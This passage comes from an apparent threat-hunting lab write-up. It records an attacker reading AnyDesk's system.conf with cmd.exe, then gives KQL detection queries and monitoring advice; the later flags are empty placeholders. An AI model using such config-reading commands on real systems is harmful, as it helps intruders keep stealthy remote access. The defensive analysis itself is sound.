**Hunting Tip:**  
`kql
EventCode=11 AND TargetFilename contains "AnyDesk.exe"

</details>

---

<details>
<summary id="-flag-42">🚩 <strong>Flag 42: <Technique Name></strong></summary>

### 🎯 Objective
Modify the remote access tool configuration to enable persistent, stealthy, and possibly unattended access to the compromised system.

### 📌 Finding
The attacker accessed and read the AnyDesk configuration file (`system.conf`) located in `C:\ProgramData\AnyDesk\`. This indicates they were inspecting or modifying settings to maintain control, such as enabling unattended access, setting passwords, or adjusting connection behavior.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-B9GHH06.emberforge.local |
| Timestamp | 2026-01-30 22:38:44.325 |
| Process | C:\Windows\System32\cmd.exe |
| Parent Process | Unknown (likely prior attacker-controlled process) |
| Command Line | cmd.exe /c type C:\ProgramData\AnyDesk\system.conf |

### 💡 Why it matters
- Indicates **post-installation configuration abuse** of a legitimate remote access tool.
- Attackers commonly modify this file to:
  - Enable **unattended access**
  - Set **hardcoded passwords**
  - Disable prompts or logging
- Stored in `ProgramData`, making it **persistent across users and reboots**.
- This step transitions from tool deployment → **operational control and persistence hardening**.
- Demonstrates **hands-on-keyboard activity**, not just automated execution.

### 🔧 KQL Query Used
EmberForgeX_CL
| where EventCode_s == "1"
| where CommandLine_s has_any ("service.conf", "AnyDesk.conf", "ProgramData\\AnyDesk")
| project UtcTime_s, Computer, Image_s, CommandLine_s
| sort by UtcTime_s asc

### 🖼️ Screenshot
<img width="1394" height="904" alt="image" src="https://github.com/user-attachments/assets/5f2e8474-a583-4b4c-b85d-ecaac2b0eb99" />

### 🛠️ Detection Recommendation
- Monitor access to sensitive configuration files of remote tools (e.g., `AnyDesk`, `TeamViewer`).
- Alert on command-line usage of:
  - `type`, `more`, `cat` against `.conf` files in `ProgramData`
- Track file modifications in:
  - `C:\ProgramData\AnyDesk\`
- Implement file integrity monitoring (FIM) for remote access tool configs.
- Restrict and audit installation/use of unauthorized remote administration tools.

**Hunting Tip:**  
`kql
EventCode=1 AND CommandLine contains "system.conf"

</details>

---

<details>
<summary id="-flag-43">🚩 <strong>Flag 43: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-44">🚩 <strong>Flag 44: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>


---

## 🚨 Detection Gaps & Recommendations

### Observed Gaps
- <Placeholder>
- <Placeholder>
- <Placeholder>

### Recommendations
- <Placeholder>
- <Placeholder>
- <Placeholder>

---

## 🧾 Final Assessment

<Concise executive-style conclusion summarizing risk, attacker sophistication, and defensive posture.>

---

## 📎 Analyst Notes

- Report structured for interview and portfolio review  
- Evidence reproducible via advanced hunting  
- Techniques mapped directly to MITRE ATT&CK  

---
